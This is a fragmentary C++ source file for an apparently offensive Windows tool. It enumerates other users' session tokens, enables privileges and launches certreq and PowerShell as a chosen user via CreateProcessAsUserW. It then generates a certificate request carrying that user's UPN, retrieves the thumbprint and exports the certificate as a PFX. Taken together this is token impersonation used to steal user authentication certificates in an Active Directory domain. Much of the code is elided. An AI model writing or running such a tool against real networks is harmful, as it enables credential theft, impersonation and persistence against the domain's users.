...
// Converts a wide string to a standard string (using system ACP)
...
// Converts a standard string to a wide string (using system ACP)
...
std::string GetUserDnsDomain() {
    ...
    // Use _popen to run the command and capture output
    ...
    // Expected output format: USERDNSDOMAIN=your.domain.com
    size_t equalsPos = result.find('=');
    if (equalsPos != std::string::npos) {
        std::string domain = result.substr(equalsPos + 1);
        // Trim whitespace and newline characters from the result
    ...
    return ""; // Return empty if parsing failed or no output
}


// --- Certificate Helper Functions --- Provided by User ---
...
std::string generateINF(const std::string& username, const std::string& domain, const std::string& infFilePath) {
    // Ensure domain is not empty before proceeding
    ...
    //// Basic parsing for DC components (assuming simple domain.com format)
    //std::string domainDC1 = domain;
    //std::string domainDC2 = "";
    //size_t firstDot = domain.find('.');
    //if (firstDot != std::string::npos) {
    //    domainDC1 = domain.substr(0, firstDot);
    //    domainDC2 = domain.substr(firstDot + 1);
    //    // Crude handling for potential multi-level domains (e.g., sub.domain.com)
    //   // This assumes the second part is the final DC component. A more robust LDAP query would be better.
    //    size_t secondDot = domainDC2.find('.');
    //    if (secondDot != std::string::npos) {
    //        // Take the part after the first dot as DC2 for simplicity here
    //        // This might not be correct for all domain structures.
    //        // Example: for ad.corp.contoso.com -> DC1=ad, DC2=corp.contoso.com (adjust if needed)
    //    }

    //}
    //else {
    //    // Handle cases like single-label domains (e.g., "CORP")
    //    // Treat the whole domain as DC1
    //}
    ...
    infFile <<
        ...
        "MachineKeySet = FALSE\n"        // User key set
        "ProviderName = \"Microsoft Enhanced Cryptographic Provider v1.0\"\n" // Legacy provider, consider "Microsoft Software Key Storage Provider" for CNG if appropriate
        "ProviderType = 1\n"            // Changed to PROV_RSA_FULL (Type 1) to match legacy provider better. Was 12 (PROV_RSA_SCHANNEL). Check requirements.
        "RequestType = PKCS10\n"         // Standard CSR format
        ...
        "_continue_ = \"dns=" << domain << "&upn=" << upn << "\"\n"; // Add DNS and UPN to SAN

    infFile.close();
    wprintf(L"[*] generateINF: Successfully generated INF file: %S\n", infFilePath.c_str());
    return infFilePath; // Return the path if successful
}

// --- Certificate Helper Functions (Command Generation) ---

// Returns the PowerShell command string to get the latest thumbprint
std::wstring getLatestThumbprintCommand() {
    // Use ASCII encoding for the output file to simplify reading in C++
...
// Reads the thumbprint from the file generated by the PowerShell command
std::string readThumbprintFromFile() {
    ...
    file.close();
    // Delete the temp file after reading? Optional.
    // DeleteFileW(StringToWString(THUMBPRINT_FILENAME).c_str());
    return trim(thumbprint); // Trim whitespace/newlines
}
...
std::wstring exportPFXCommand(const std::string& thumbprint, const std::string& username) {
    ...
    // Use ASCII for password string input to PowerShell
...
typedef struct {
    ...
    int DisplayId;
    DWORD SessionId;
    wchar_t Username[FULL_NAME_LENGTH];     // Full name (Domain\User or User) for display
    wchar_t UsernameOnly[MAX_USERNAME_LENGTH]; // Just the username part
    wchar_t DomainName[MAX_DOMAINNAME_LENGTH];   // Just the domain part (if available)
...
std::string g_userDnsDomain = ""; // Global variable to store domain name
...
void ClearInputBuffer() {
    ...
    std::wcin.clear();
    // Ignore remaining characters in the buffer up to the next newline
...
bool EnablePrivilege(LPCWSTR privilegeName) {
    ...
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        ...
        if (lastError == ERROR_NOT_ALL_ASSIGNED) {
            // wprintf(L"[*] EnablePrivilege: Process does not hold privilege %ls.\n", privilegeName);
        }
        else {
    ...
    CloseHandle(hToken); // Close handle here
...
bool InitializePrivileges() {
    ...
    // Check essential privileges again
...
bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalCommandLine) {
    ...
    // *** UPDATED: Check if executable is certreq.exe or powershell.exe and prepend "cmd /c " ***
    if (wcscmp(fileName, L"certreq.exe") == 0 || wcscmp(fileName, L"powershell.exe") == 0) {
        useCmd = true;
        // Assuming cmd.exe is in PATH, no need for full path usually
        // executablePath = L"C:\\Windows\\System32\\cmd.exe";
        commandToExecute = L"cmd /c \"" + originalCommandLine + L"\""; // Wrap original command
        wprintf(L"\t[*] Using 'cmd /c' wrapper.\n");
    }
    else {
        executablePath = L""; // Let CreateProcess search PATH
    ...
    if (CreateProcessAsUserW(hPrimaryToken,
        NULL, // Pass NULL for app name when using cmd /c or relying on PATH
        mutableCommandLine,
        NULL, NULL, FALSE,
        CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, // Keep new console
        NULL,
        currentDir.c_str(), // Set current directory
        &si, &pi))
    {
    ...
    if (success) {
        ...
        if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
            wprintf(L"\t[*] Process exit code: %lu (0x%lX)\n", exitCode, exitCode); // Show Hex code too
            if (exitCode != 0) {
                wprintf(L"\t[!] Warning: Process exited with non-zero code.\n");
                // Decide if this constitutes failure for the calling function
                // For now, we still return true if the process launched and completed.
                // The calling function might need to check specific exit codes if needed.
            }
        }
        else {
    ...
    return success; // Return true if process launched, regardless of exit code for now
}
...
// --- NEW Function to Handle Certificate Request Sequence ---
void RequestCertificateForToken(int tokenId) {
    ...
    wprintf(L"[*]   Domain: %S\n", g_userDnsDomain.c_str()); // Use global domain
    ...
    bool stepSuccess = true; // Track success through steps
    ...
    if (stepSuccess) {
        ...
        if (!RunCommandAsToken(*pSelectedToken, cmdAccept)) {
            ...
            // Might still proceed to check thumbprint if accept technically ran but had issues? Let's stop here for now.
            stepSuccess = false;
        }
    }

    // Optional: Add a small delay after accept before querying thumbprint
    if (stepSuccess) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    // 6. Get Thumbprint (Run PowerShell command, then read file)
    std::string thumbprint = "";
    if (stepSuccess) {
        ...
        if (!RunCommandAsToken(*pSelectedToken, cmdThumb)) {
            ...
            // Try reading the thumbprint file only if the command execution succeeded
    ...
    // 7. Export PFX (Run PowerShell command)
    if (stepSuccess) { // Only proceed if all previous steps including getting thumbprint worked
        ...
        if (!RunCommandAsToken(*pSelectedToken, cmdExport)) {
            ...
            // Mark as overall failure maybe?
            stepSuccess = false; // Mark failure if export doesn't work
        }
        else {
...
int wmain(int argc, wchar_t* argv[]) {
    ...
    if (g_userDnsDomain.empty()) {
        std::wcout << L"[!] Critical Error: Could not determine user DNS domain via 'set USERDNSDOMAIN'." << std::endl;
        std::wcout << L"[*] Please ensure the command works manually and provides output like 'USERDNSDOMAIN=your.domain.com'" << std::endl;
        return 1;
    }
    ...
    do {
        ...
        if (std::wcin.fail()) {
            ...
            choice = 0; // Reset choice to avoid accidental exit if 3 was last valid input
            continue; // Skip to next iteration
        }
        ClearInputBuffer(); // Clear newline character after successful integer input

        // Process Choice
        switch (choice) {
        case 1: // Scan and Display
            CleanupTokenHandles(); // Clean up old handles first
        ...
        case 2: // Request Certificate
            if (g_discoveredTokens.empty()) {
                ...
                if (std::wcin.fail()) {
                    ...
                    ClearInputBuffer(); // Clear newline after ID input
                    RequestCertificateForToken(selectedId); // Call the processing function
                }
            }
            break;
